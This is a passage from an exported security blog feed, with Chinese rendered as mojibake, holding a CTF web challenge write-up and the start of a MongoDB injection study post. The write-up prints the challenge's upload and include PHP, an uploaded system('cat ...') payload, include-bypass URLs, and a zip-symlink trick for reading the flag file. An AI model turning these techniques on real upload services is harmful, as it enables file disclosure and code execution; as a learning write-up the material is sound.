<span class="string">"error1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($cert === <span class="string">'Y'</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span> (stripos($file, <span class="string">'file_list'</span>) != <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">'error4'</span>);</span><br><span class="line">      <span class="keyword">if</span> (stripos($file, <span class="string">'file_list'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      header(<span class="string">'Content-Description: File Transfer'</span>);</span><br><span class="line">      header(<span class="string">'Content-Type: application/octet-stream'</span>);</span><br><span class="line">      header(<span class="string">'Content-Disposition: attachment; filename='</span>. basename($file));</span><br><span class="line">      header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">      header(<span class="string">'Expires: 0'</span>);</span><br><span class="line">      header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class="line">      header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">      header(<span class="string">'Content-Length: '</span> . filesize($file));</span><br><span class="line">      readfile($file);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'error2'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'error3'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">    $page = <span class="string">'index'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125;<span class="comment">//ä¸å…è®¸è·³ç›®å½•</span></span><br><span class="line"><span class="keyword">if</span> (stripos($page, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'no ./ ./ ./ ./'</span>);</span><br><span class="line">&#125;<span class="comment">//ä¸å…è®¸ç”¨åè®®</span></span><br><span class="line"><span class="keyword">if</span> (stripos($page, <span class="string">'://'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'no :// :// ://'</span>);</span><br><span class="line">&#125;</span><br><span class="line">autoload($page);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[admin]) &amp;&amp; <span class="keyword">isset</span>($_GET[file])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (stripos($_GET[admin], <span class="string">'flag'</span>) &gt; <span class="number">0</span> || stripos($_GET[file], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'not flag flag flag falg !'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (strlen($_GET[file]) &gt;= <span class="number">38</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'too long'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  download($_GET[admin], $_GET[file]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªé¢˜è¿˜æœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œè¦æ‹¿åˆ°upload.phpã€‚è¯»æ–‡ä»¶çš„ç‚¹åœ¨</p>
<ul>
<li>è¿™é‡Œå¯ä»¥ç”¨è¿œç¨‹æœåŠ¡å™¨å†™ echo -n â€œYeah Everything Will Be Ok My Bossâ€ &gt;&gt; index.htmlï¼Œç„¶åè®¿é—®è¯»å–</li>
<li>ä¹Ÿå¯ä»¥php://input+Yeah Everything Will Be Ok My Boss</li>
</ul>
<p>ä¸‹é¢æ‹¿åˆ°download.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no flag flag flag flag !'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="comment">//properties of the uploaded file</span></span><br><span class="line">    $name= $_FILES[<span class="string">"filename"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $type= $_FILES[<span class="string">"filename"</span>][<span class="string">"type"</span>];</span><br><span class="line">    $size= $_FILES[<span class="string">"filename"</span>][<span class="string">"size"</span>];</span><br><span class="line">    $temp= $_FILES[<span class="string">"filename"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $error= $_FILES[<span class="string">"filename"</span>][<span class="string">"error"</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($name) &gt;= <span class="number">6</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'name is too long !'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($name, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'invalid parameter'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($name, <span class="string">'php'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'invalid parameter'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åªèƒ½ä¸Šä¼ zip</span></span><br><span class="line">    <span class="keyword">if</span> (substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'zip'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'jpg'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'png'</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'file can not upload ! '</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($error &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Error uploading file! code $error."</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">        <span class="keyword">if</span>($type !== <span class="string">"application/zip"</span> || $size &gt; <span class="number">400</span>)<span class="comment">//condition for the file</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Format not allowed or file size too big!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span>(file_exists(<span class="string">'includes'</span>))&#123;</span><br><span class="line">            move_uploaded_file($temp, <span class="string">"includes/uploaded/"</span> .$name);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Upload complete a!"</span>;</span><br><span class="line">            shell_exec(<span class="string">'sh /var/www/html/includes/ '</span>);</span><br><span class="line">          &#125;<span class="keyword">elseif</span>(file_exists(<span class="string">'uploaded'</span>))&#123;</span><br><span class="line">            move_uploaded_file($temp, <span class="string">"uploaded/"</span> .$name);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Upload complete!"</span>;</span><br><span class="line">            shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</span><br><span class="line">          &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'step'</span>]) &amp;&amp; strlen($_GET[<span class="string">'step'</span>]) === <span class="number">20</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'lag'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">' '</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'/'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (preg_match(<span class="string">'/[^\w\d_ -]/si'</span>, $_GET[<span class="string">'step'</span>])) &#123;</span><br><span class="line">        $_GET[<span class="string">'step'</span>] = preg_replace(<span class="string">'/[^a-zA-Z0-9_ -]/s'</span>, <span class="string">''</span>, $_GET[<span class="string">'step'</span>]);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">        passthru(<span class="string">'cat '</span> . <span class="string">'uploaded/'</span> . $_GET[<span class="string">'step'</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç çš„å¤§æ„æ˜¯åªèƒ½ä¸Šä¼ é•¿åº¦æœ‰é™çš„ä»£ç ï¼Œç„¶åä¼šè¿›å…¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125;<span class="keyword">elseif</span>(file_exists(<span class="string">'uploaded'</span>))&#123;</span><br><span class="line">  move_uploaded_file($temp, <span class="string">"uploaded/"</span> .$name);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Upload complete!"</span>;</span><br><span class="line">  shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨åŒæ ·çš„æ‰‹æ³•è¯»å‡ºunzip.sh</p>
<p>å¯ä»¥çœ‹åˆ°å®ƒæ˜¯å…ˆè§£å‹å‹ç¼©åŒ…ç„¶åä¸€ç‚¹ä¸€ç‚¹çš„åˆ æ‰ã€‚</p>
<p>æ‰€ä»¥ç¬¬ä¸€ç§æ–¹å¼å°±æ˜¯åˆ©ç”¨æ—¶é—´å·®æ¡ä»¶ç«äº‰ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘é˜Ÿå¸ˆå‚…ç”¨çš„æ–¹æ³•ã€‚è¿™é‡Œçœç•¥ã€‚</p>
<p>ç„¶åç¬¬äºŒå¤©çœ‹åˆ«äººwpçš„æ—¶å€™ã€‚å‘ç°ä¸€ä¸ªæ¯”è¾ƒå·§å¦™çš„æ–¹æ³•ï¼Œå°±æ˜¯è§‚å¯Ÿåˆ°shå¹¶æ²¡æœ‰åˆ é™¤æ‰€æœ‰çš„æ–‡ä»¶ï¼Œä¿ç•™äº†æ²¡æœ‰åç¼€åçš„æ–‡ä»¶ï¼ˆ<code>rm -rf ./uploaded/.*</code>å¹¶ä¸æ˜¯åˆ é™¤å½“å‰æ–‡ä»¶æ‰€æœ‰å†…å®¹çš„å‘½ä»¤ï¼‰ã€‚æ‰€ä»¥å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ²¡æœ‰åç¼€åçš„phpç„¶åç”¨index.phpçš„åŒ…å«ä»£ç åŒ…å«è¿›æ¥ã€‚</p>
<p>åœ¨zipä¸­å‹ç¼©ä¸€ä¸ªcloundæ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼ˆè¿™é‡Œéœ€è¦æ³¨æ„å› ä¸ºæ˜¯includeè¿›æ¥ï¼Œæ‰€ä»¥catåé¢çš„è·¯å¾„æ˜¯flagå’Œindex.phpçš„è·¯å¾„ï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="string">'cat flag/flag/flag/flag/flag/flag/flag.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®<code>http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/clound</code></p>
<p>è¿™ä¸ªpayloadçš„æ„é€ å¾ˆæœ‰æ„æ€å·§å¦™çš„ç»•è¿‡äº†ã€‚</p>
<p>æ³¨æ„åˆ°flagæ˜¯flag{CVE_SomeThing_aBout_gitLab}ä¹Ÿå°±å°±è¯´ä¸Šè¿°ä¸¤ç§æ–¹æ³•éƒ½åº”è¯¥æ˜¯éé¢„æœŸã€‚</p>
<p>åœ¨ç½‘æœä¸€ä¸‹gitlabçš„å†å²æ¼æ´æ³¨æ„åˆ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„æ¼æ´é€šè¿‡è½¯è¿æ¥æ¥è¯»æ–‡ä»¶ï¼Œéšéšæ„Ÿè§‰å¦‚æœç”¨è¿™ä¸ªå§¿åŠ¿æ¥åšæ˜¯ä¸€ä¸ªå¾ˆä¼˜é›…çš„è§£æ³•ã€‚</p>
<p>é¦–å…ˆç»è¿‡ä¸€æ¬¡å¤±è´¥çš„å®éªŒå‘ç°è½¯è¿æ¥æ˜¯ç›¸å¯¹çš„è·¯å¾„çš„ã€‚ä¹Ÿå°±è¯´å»ºç«‹è½¯è¿æ¥çš„æ—¶å€™è¦æŠŠflagçš„ä½ç½®å’Œè½¯è¿æ¥çš„ä½ç½®æ‘†å¥½ã€‚å‡è®¾/var/www/htmlä¸ºæ ¹ç›®å½•</p>
<p>flagçš„ä½ç½®<code>/var/www/html/flag/flag/flag/flag/flag/flag/flag.php</code></p>
<p>ä¸Šä¼ çš„ä½ç½®</p>
<p>/flag/flag/flag/flag/flag/flag/flag.php</p>
<p>åœ¨webç›®å½•ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p flag&#x2F;flag&#x2F;flag&#x2F;flag&#x2F;flag&#x2F;flag&#x2F;</span><br><span class="line">mkdir -p includes&#x2F;uploaded</span><br><span class="line">echo &quot;flag&quot; &gt;&gt; flag&#x2F;flag&#x2F;flag&#x2F;flag&#x2F;flag&#x2F;flag&#x2F;flag.php</span><br><span class="line">cd includes&#x2F;uploaded</span><br><span class="line">ln -s ..&#x2F;..&#x2F;flag&#x2F;flag&#x2F;flag&#x2F;flag&#x2F;flag&#x2F;flag&#x2F;flag.php aaaaabbbbbcccccddddd</span><br></pre></td></tr></table></figure>

<p>ç„¶åå‹ç¼©è½¯è¿æ¥ï¼Œä¸Šä¼ å¦‚å›¾</p>
<p><img src="%E6%8A%93%E5%8C%85.jpg" alt="æŠ“åŒ….jpg"></p>
<p>ä»å›¾ä¸­æˆ‘ä»¬ä¹Ÿèƒ½æ¸…æ¥šçœ‹åˆ°è½¯è¿æ¥æ˜¯ç›¸å¯¹è·¯å¾„</p>
<p>æœ€åè®¿é—®<code>http://47.104.188.226:20001/includes/uploaded/aaaaabbbbbcccccddddd</code></p>
<p>å³å¯çœ‹åˆ°flag</p>
<p>ä¹Ÿè®¸ä½ æ³¨æ„æŠŠè½¯è¿æ¥å¼„åˆ°20ä¸ªå­—ç¬¦ï¼Œæ˜¯å› ä¸ºåœ¨åšçš„æ—¶å€™æˆ‘çŠ¯äº†ä¸ªé”™è¯¯ï¼Œæˆ‘ä»¥ä¸ºæŠŠè½¯è¿æ¥ä¼ ä¸Šå»apacheä¹Ÿä¼šè·Ÿç€è½¯è¿æ¥çš„æŒ‡å‘å»è§£æphpï¼Œç„¶åç»“åˆä¸€ä¸‹ä»£ç æ‰èƒ½åˆ©ç”¨ã€‚</p>
<p><img src="%E8%BD%AF%E8%BF%9E%E6%8E%A5.png" alt="è½¯è¿æ¥.png"></p>
<p>å»è¯»æ–‡ä»¶ä½†å…¶å®ä¸æ˜¯è¿™æ ·çš„ï¼Œç›´æ¥è®¿é—®è½¯è¿æ¥å°±å¯ä»¥çœ‹åˆ°å†…å®¹ã€‚ç»“åˆè¿™å‡ å¤©çš„apacheçš„ä¸€äº›çŸ¥è¯†ï¼Œæˆ‘æƒ³ç»™å‡ºè‡ªå·±çš„ç­”æ¡ˆã€‚</p>
<h2 id="apacheè§£æphpçš„åŸç†"><a href="#apacheè§£æphpçš„åŸç†" class="headerlink" title="apacheè§£æphpçš„åŸç†"></a>apacheè§£æphpçš„åŸç†</h2><p>é¦–å…ˆä¸€ä¸ªå¸¸è¯†æ˜¯Apacheè‡ªèº«å¹¶ä¸èƒ½è§£æphpã€‚Apacheæ˜¯ä¸€ä¸ªæ¨¡å—åŒ–ç¨‹åºï¼Œè¿™è¿™å°±æ„å‘³ç€æœåŠ¡å™¨åªåŒ…æ‹¬æœ€åŸºæœ¬çš„åŠŸèƒ½ï¼Œå…¶ä»–çš„æ‹“å±•çš„åŠŸèƒ½å¯ä»¥åŠ è½½æ¨¡å—å®ç°ã€‚Apacheå¯¹äºphpçš„è§£æï¼Œå°±æ˜¯é€šè¿‡ä¼—å¤šModuleä¸­çš„php Moduleæ¥å®Œæˆçš„ã€‚</p>
<p>è¿™ä¸ªphpæ¨¡å—ä¼šéšç€apacheçš„å¯åŠ¨è¢«loadè¿›æ¥ã€‚å¯ä»¥é€šè¿‡<code>apachectl -M</code>æ¥æŸ¥çœ‹</p>
<p>é‚£ä¹ˆapacheæ˜¯æ€ä¹ˆåˆ¤æ–­è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸æ˜¯åº”è¯¥äº¤ç»™phpæ¨¡å—å¤„ç†çš„å‘¢ï¼Ÿç­”æ¡ˆæ˜¯é€šè¿‡MIMEç±»å‹ã€‚</p>
<p><img src="%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E6%A8%A1%E5%9D%97.png" alt="æ­£åœ¨è¿è¡Œçš„æ¨¡å—.png"></p>
<p>linuxä¸Šæœ‰ä¸ª<code>/etc/mime.types</code>å®ƒæ˜¯mime-supportåŒ…çš„ä¸€éƒ¨åˆ†ï¼Œè¿™é‡Œé¢è®°å½•äº†æ‰€æœ‰çš„MIMEç±»å‹ã€‚</p>
<p>å½“å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªæ–‡ä»¶æ—¶,å¦‚æœåç¼€åœ¨è¿™ä¸ªåˆ—è¡¨é‡Œ,é‚£ä¹ˆapacheå°±è¿”å›å¯¹åº”çš„content-typeç»™æµè§ˆå™¨ï¼Œå¦‚æœä¸åœ¨é‡Œé¢apacheè¿™ä¸ªè¡¨é‡Œé¢åˆ™ç›´æ¥è¿”å›æ–‡ä»¶çš„å†…å®¹ï¼ˆä¸è¿”å›content-typeï¼‰ã€‚</p>
<p><img src="MIME.png" alt="MIME.png"></p>
<p>å½“ç„¶è¿™ä¸ªä½ é¢æœ‰å…³phpçš„æ˜¯è¢«æ³¨é‡Šæ‰äº†ã€‚ä¸è¿‡åœ¨<code>/etc/apache2/mods-enabled/php7.0.conf</code>æœ‰ä¸­æœ‰è¿™æ ·ä¸€æ¡ç­‰ä»·é…ç½®ã€‚</p>
<p>å®ƒè¡¨ç¤ºä¸€æ—¦åŒ¹é…åˆ°php|php3|php4|php5|php7|pht|phtmè¿™ç§ä¸œè¥¿åˆ™å¼ºåˆ¶æ‰§è¡Œapplication/x-httpd-phpè¿™ç§ç±»å‹æ‰€å¯¹åº”çš„å¤„ç†å™¨ï¼ˆphp7_moudleï¼‰ã€‚</p>
<p>å›å¤´çœ‹åˆšæ‰ä¸Šä¼ è½¯è¿æ¥æ²¡æœ‰åç¼€ï¼Œæ‰€ä»¥apacheä¸å¯èƒ½è®¤è¯†ï¼Œäºæ˜¯ä»–è¯»å‡ºåŸæœ¬çš„å†…å®¹ï¼ˆflag.phpï¼‰ç„¶åç›´æ¥è¿”å›å¹¶ä¸å¸¦ä»»ä½•content-typeï¼Œæœ‰å›¾ä¸ºè¯ã€‚</p>
<p><img src="%E8%AF%81%E6%8D%AE.png" alt="è¯æ®.png"></p>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æœ€åè‡ªå·±çš„æ€è€ƒå¹¶ä¸ä¿è¯æ­£ç¡®ï¼Œå¦‚æœå‡ºé”™è¿˜è¯·æŒ‡æ­£ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/#more">https://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/#more</a></p>
<p><a href="https://paper.seebug.org/104/">https://paper.seebug.org/104/</a></p>
<p><a href="http://drops.chamd5.org/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE">http://drops.chamd5.org/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE</a></p>
<p><a href="http://03i0.com/2017/10/19/Apache%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/">http://03i0.com/2017/10/19/Apache%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>MONGODBæ³¨å…¥å­¦ä¹ </title>
    <url>/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<!-- With MongoDB we are not building queries from strings, so traditional SQL injection attacks are not a problem. -MongoDB Developer FAQ -->
<!-- more -->

<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>ä¸»è¦æ˜¯å¯¹ç½‘ä¸Špaperçš„ä¸€äº›æ€»ç»“ä»¥åŠæœ€è¿‘é‡åˆ°åœºæ™¯çš„ä¸€äº›æ€»ç»“ã€‚</p>
<p><strong>åƒä¸‡ä¸è¦ç”¨php7æ­ç¯å¢ƒï¼åƒä¸‡ä¸è¦ç”¨php7æ­ç¯å¢ƒï¼åƒä¸‡ä¸è¦ç”¨php7æ­ç¯å¢ƒï¼</strong></p>
<p>å¯¹æ¯”ä¸€ä¸‹ä»£ç é‡å¯ä»¥å‘ç°php7çš„mongodbæ‰©å±•å®åœ¨æ˜¯å¤ªæ¶å¿ƒäº†ã€‚æ‰€ä»¥ä¸å«Œéº»çƒ¦çš„è¯å»ºè®®ç”¨ubuntu14ã€‚</p>
<p>php5</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> MongoClient())-&gt;&#123;$db&#125;-&gt;&#123;$collection&#125;-&gt;findOne([<span class="string">'_id'</span> =&gt; $id]);</span><br></pre></td></tr></table></figure>

<p>php7</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$mongo = <span class="keyword">new</span> MongoDB\Driver\Manager();</span><br><span class="line">$result = $mongo-&gt;executeQuery(<span class="string">'db.collection'</span>, <span class="keyword">new</span> MongoDB\Driver\Query([<span class="string">'_id'</span>=&gt;$id], []), <span class="keyword">new</span> MongoDB\Driver\ReadPreference(MongoDB\Driver\ReadPreference::RP_PRIMARY_PREFERRED));</span><br><span class="line"><span class="comment">// è¿”å›çš„$resultæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦æ‰‹åŠ¨è½¬æ¢æˆæ•°ç»„ã€‚</span></span><br></pre></td></tr></table></figure>

<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>lampç¯å¢ƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get apache2</span><br><span class="line">sudo apt-get install php5 php-pear php5-dev</span><br><span class="line">sudo apt-get install libsasl2-dev</span><br></pre></td></tr></table></figure>

<p>å®‰è£…php mongdbæ‰©å±•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pecl install mongodb</span><br></pre></td></tr></table></figure>

<p>é¢å¤–å®‰è£…mongodb serverï¼Œæ³¨æ„ä¸è¦ç”¨apt-getè‡ªå¸¦çš„å®‰è£…ï¼Œé‚£ä¸ªç‰ˆæœ¬è²Œä¼¼æ¯”è¾ƒä½ï¼Œç”¨ä¸äº†ç®€æ´çš„phpå†™æ³•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1404-3.4.9.tgz</span><br><span class="line">tar -zxvf </span><br><span class="line">mongodb-linux-x86_64-ubuntu1404-3.4.9.tgz</span><br><span class="line"><span class="built_in">cd</span> mongodb-linux-x86_64-ubuntu1404-3.4.9/bin</span><br><span class="line">sudo apt-get install mongodb-server</span><br></pre></td></tr></table></figure>

<p>å°†<code>extension=mongodb.so</code>æ”¾å…¥çš„php.iniä¸­ï¼Œå› ä¸ºè£…çš„apacheæ•…ä¿®æ”¹<code>/etc/php/7.0/apache2</code></p>
<p><img src="phpinfo.png" alt="phpinfo.png"></p>
<p>å¦å¤–mongodbè¿˜æœ‰ä¸€ä¸ª28017ç«¯å£æ˜¯mongodbçš„webç®¡ç†æ¥å£</p>
<p><img src="%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3.jpg" alt="é»˜è®¤ç«¯å£.jpg"></p>
<p><img src="%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A32.png" alt="é»˜è®¤ç«¯å£2.png"></p>
<p><img src="web.jpg" alt="web.jpg"></p>
<h2 id="åŸºæœ¬ç®€å•æ“ä½œ"><a href="#åŸºæœ¬ç®€å•æ“ä½œ" class="headerlink" title="åŸºæœ¬ç®€å•æ“ä½œ"></a>åŸºæœ¬ç®€å•æ“ä½œ</h2><ul>
<li><p>åˆ‡æ¢æˆ–åˆ›å»ºæ•°æ®åº“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use runoob</span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ é™¤æ•°æ®åº“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ›å»ºé›†åˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.site.insert(&quot;goole&quot;:&quot;www.google.com&quot;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ é™¤é›†åˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.site.drop()</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ’å…¥æ–‡æ¡£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und&quot;,</span><br><span class="line">	password:&quot;cl0und1pass&quot;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ›´æ–°æ–‡æ¡£<br>updateæ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.site.update(&#123;&#39;title&#39;:&#39;MongoDB æ•™ç¨‹&#39;&#125;,&#123;$set:&#123;&#39;title&#39;:&#39;MongoDB&#39;&#125;&#125;)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>saveæ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.collection.save(</span><br><span class="line">   &lt;document&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤æ–‡æ¡£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.collection.remove(</span><br><span class="line">   &lt;query&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     justOne: &lt;boolean&gt;,</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>


<h2 id="ä¸»è¦è¯´è¯´æŸ¥æ‰¾"><a href="#ä¸»è¦è¯´è¯´æŸ¥æ‰¾" class="headerlink" title="ä¸»è¦è¯´è¯´æŸ¥æ‰¾"></a>ä¸»è¦è¯´è¯´æŸ¥æ‰¾</h2><p>åœ¨æˆ‘æ‰€è§çš„paperä¸­åŸºæœ¬ä¸Šéƒ½æ˜¯è®²é€šè¿‡æŸ¥æ‰¾æ³¨å…¥ã€‚</p>
